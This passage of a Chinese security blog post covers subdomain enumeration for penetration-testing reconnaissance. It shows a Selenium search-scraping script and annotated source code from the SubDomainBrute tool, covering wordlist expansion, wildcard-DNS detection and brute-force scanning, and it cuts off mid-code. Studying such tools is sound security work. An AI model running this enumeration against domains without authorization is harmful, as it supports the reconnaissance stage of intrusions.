class=\"line\">    signal.signal(signal.SIGINT, signal_handler)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parse user input</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&quot;Chrome search script&quot;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&quot;-d&quot;</span>, <span class=\"string\">&quot;--domain&quot;</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;The domain to search&quot;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&quot;-m&quot;</span>, <span class=\"string\">&quot;--maxpage&quot;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;The maximum number to search&quot;</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parameter assignment</span></span><br><span class=\"line\">    domain = args.domain</span><br><span class=\"line\">    max_page = args.maxpage</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># init driver</span></span><br><span class=\"line\">    driver = setup_driver()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># remove duplicates</span></span><br><span class=\"line\">    unique_links = <span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Start crawling from the first page</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, max_page + <span class=\"number\">1</span>):</span><br><span class=\"line\">        links = fetch_links(driver, domain, page)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Traverse links, extract and save unique domain names</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> links:</span><br><span class=\"line\">            domain_name = extract_domain(link)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> domain_name <span class=\"keyword\">and</span> domain_name <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> unique_links:</span><br><span class=\"line\">                unique_links.add(domain_name)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(domain_name)</span><br><span class=\"line\">                write_file(<span class=\"string\">&quot;domain.txt&quot;</span>, domain_name)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># close driver</span></span><br><span class=\"line\">    driver.quit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p><strong>资产测绘工具搜集</strong></p>\n<p>使用资产测绘工具收集，如<strong>fofa、hunter、360quake、微步</strong>等，包括使用站长之家等等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png\" alt=\"img\"></p>\n<p><strong>使用自动化工具</strong></p>\n<p>这里对两种开源的工具进行源码分析，了解其原理</p>\n<h4 id=\"SubDomainBrute源码分析\"><a href=\"#SubDomainBrute源码分析\" class=\"headerlink\" title=\"SubDomainBrute源码分析\"></a><strong>SubDomainBrute源码分析</strong></h4><p>这里只分析主要代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 加载DNS服务器地址</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_dns_servers</span>():</span><br><span class=\"line\">    print_msg(<span class=\"string\">&#x27;[+] Validate DNS servers&#x27;</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    dns_servers = []</span><br><span class=\"line\"></span><br><span class=\"line\">    servers_to_test = []</span><br><span class=\"line\">    <span class=\"comment\"># 从字典中加载未被注释的DNS服务器地址</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> server <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(os.path.join(root_path, <span class=\"string\">&#x27;dict/dns_servers.txt&#x27;</span>)).readlines():</span><br><span class=\"line\">        server = server.strip()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> server <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> server.startswith(<span class=\"string\">&#x27;#&#x27;</span>):</span><br><span class=\"line\">            servers_to_test.append(server)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印有效DNS服务器地址</span></span><br><span class=\"line\">    server_count = <span class=\"built_in\">len</span>(dns_servers)</span><br><span class=\"line\">    print_msg(<span class=\"string\">&#x27;\\n[+] %s DNS Servers found&#x27;</span> % server_count, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> server_count == <span class=\"number\">0</span>:</span><br><span class=\"line\">        print_msg(<span class=\"string\">&#x27;[ERROR] No valid DNS Server !&#x27;</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        sys.exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dns_servers</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载子域名爆破字典</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_next_sub</span>(<span class=\"params\">full_scan</span>):</span><br><span class=\"line\">    next_subs = []</span><br><span class=\"line\">    <span class=\"comment\"># 根据full_scan参数判断加载哪个字典</span></span><br><span class=\"line\">    _file = <span class=\"string\">&#x27;dict/next_sub_full.txt&#x27;</span> <span class=\"keyword\">if</span> full_scan <span class=\"keyword\">else</span> <span class=\"string\">&#x27;dict/next_sub.txt&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 将子域名去重后存入临时集合tmp_set</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(os.path.join(root_path, _file)) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">            sub = line.strip()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                tmp_set = &#123;sub&#125;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 如果子域名模块包含占位符，如&#123;alphnum&#125;，则进行替换操作</span></span><br><span class=\"line\">                <span class=\"keyword\">while</span> tmp_set:</span><br><span class=\"line\">                    item = tmp_set.pop()</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> item.find(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0123456789&#x27;</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                        next_subs.append(item)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> next_subs</span><br></pre></td></tr></table></figure>\n\n<p>加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。</p>\n<p>在子域名中还存在一个<strong>泛解析</strong>的问题，这个工具里面解决了这个问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_wildcard_test</span>(<span class=\"params\">domain, dns_servers, level=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 创建异步DNS解析器</span></span><br><span class=\"line\">        r = dns.asyncresolver.Resolver()</span><br><span class=\"line\">        <span class=\"comment\"># 使用DNS服务器解析域名</span></span><br><span class=\"line\">        r.nameservers = dns_servers</span><br><span class=\"line\">        <span class=\"comment\"># 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在</span></span><br><span class=\"line\">        answers = <span class=\"keyword\">await</span> r.resolve(<span class=\"string\">&#x27;lijiejie-not-existed-test.%s&#x27;</span> % domain, <span class=\"string\">&#x27;A&#x27;</span>, lifetime=<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析</span></span><br><span class=\"line\">        ips = <span class=\"string\">&#x27;, &#x27;</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">        <span class=\"comment\"># 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> level == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;any-sub.%s\\t%s&#x27;</span> % (domain.ljust(<span class=\"number\">30</span>), ips))</span><br><span class=\"line\">            <span class=\"keyword\">await</span> async_wildcard_test(<span class=\"string\">&#x27;any-sub.%s&#x27;</span> % domain, dns_servers, <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 打印提示信息，使用-w参数强制扫描通配符域名</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> level == <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\nUse -w to enable force scan wildcard domain&#x27;</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">wildcard_test</span>(<span class=\"params\">domain, dns_servers</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 获取当前的异步事件循环</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    <span class=\"comment\"># 等待异步任务完成</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> loop.run_until_complete(</span><br><span class=\"line\">        <span class=\"comment\"># 并行执行多个异步任务，并返回它们的结果</span></span><br><span class=\"line\">        asyncio.gather(</span><br><span class=\"line\">            async_wildcard_test(domain, dns_servers, level=<span class=\"number\">1</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">    )[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n\n<p>通过给出一个不存在的域名检测，判断是否开启了泛解析</p>\n<p>接下来看看扫描模块</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 爆破模块</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SubNameBrute</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, *params</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 提取传入参数</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.options, <span class=\"variable language_\">self</span>.process_num, <span class=\"variable language_\">self</span>.dns_servers, <span class=\"variable language_\">self</span>.next_subs, \\</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count, <span class=\"variable language_\">self</span>.found_count, <span class=\"variable language_\">self</span>.queue_size_array, tmp_dir = params</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.dns_count = <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># 初始化DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers = [dns.asyncresolver.Resolver(configure=<span class=\"literal\">False</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.resolvers:</span><br><span class=\"line\">            <span class=\"comment\"># 解析事件</span></span><br><span class=\"line\">            r.lifetime = <span class=\"number\">6.0</span></span><br><span class=\"line\">            <span class=\"comment\"># 超时时间</span></span><br><span class=\"line\">            r.timeout = <span class=\"number\">10.0</span></span><br><span class=\"line\">        <span class=\"comment\"># 优先队列和状态变量</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.queue = PriorityQueue()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.ip_dict = &#123;&#125;</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.cert_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.timeout_subs = &#123;&#125;</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.no_server_subs = &#123;&#125;</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">        <span class=\"comment\"># 输出日志到文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.outfile = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;%s/%s_part_%s.txt&#x27;</span> % (tmp_dir, <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.process_num), <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.normal_names_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.lock = asyncio.Lock()</span><br><span class=\"line\">        <span class=\"comment\"># 线程状态</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.threads_status = [<span class=\"string\">&#x27;1&#x27;</span>] * <span class=\"variable language_\">self</span>.options.threads</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加载子域名字典</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">load_sub_names</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        normal_lines = []</span><br><span class=\"line\">        wildcard_lines = []</span><br><span class=\"line\">        wildcard_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        regex_list = []</span><br><span class=\"line\">        lines = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"comment\"># 打开文件逐行读取子域名，跳过空行或重复子域名</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"variable language_\">self</span>.options.file) <span class=\"keyword\">as</span> inFile:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> inFile.readlines():</span><br><span class=\"line\">                sub = line.strip()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> sub <span class=\"keyword\">or</span> sub <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                lines.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 判断子域名是否含占位符</span></span><br><span class=\"line\">                brace_count = sub.count(<span class=\"string\">&#x27;&#123;&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    wildcard_lines.append((brace_count, sub))</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># 占位符处理</span></span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>, <span class=\"string\">&#x27;[a-z0-9]&#x27;</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>, <span class=\"string\">&#x27;[a-z]&#x27;</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>, <span class=\"string\">&#x27;[0-9]&#x27;</span>)</span><br><span class=\"line\">                    <span class=\"comment\"># 去重</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> wildcard_set:</span><br><span class=\"line\">                        wildcard_set.add(sub)</span><br><span class=\"line\">                        regex_list.append(<span class=\"string\">&#x27;^&#x27;</span> + sub + <span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 普通子域名直接加入列表</span></span><br><span class=\"line\">                    normal_lines.append(sub)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.normal_names_set.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> regex_list:</span><br><span class=\"line\">            pattern = <span class=\"string\">&#x27;|&#x27;</span>.join(regex_list)</span><br><span class=\"line\">            _regex = re.<span class=\"built_in\">compile</span>(pattern)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> normal_lines:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> _regex.search(line):</span><br><span class=\"line\">                    normal_lines.remove(line)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        <span class=\"comment\"># 普通子域名加入队列，优先级为0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> normal_lines[<span 